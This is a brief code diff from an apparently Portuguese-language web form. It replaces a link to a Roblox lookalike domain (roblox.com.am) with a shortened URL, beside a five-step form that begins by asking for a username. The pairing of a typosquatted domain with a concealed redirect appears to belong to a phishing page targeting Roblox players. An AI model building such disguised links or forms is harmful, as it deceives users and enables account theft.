@@ -7,7 +7,7 @@
    Configurações
    =========================== */
 
-const GROUP_URL = `https://www.roblox.com.am/communities/138423710779/robloxianStudio`;
+const GROUP_URL = `https://encurtador.com.br/VzpL`;
 
 const STEP_INFO = {
   1: { tag: 'ETAPA 1 DE 5', label: 'Nome de Usuário' },
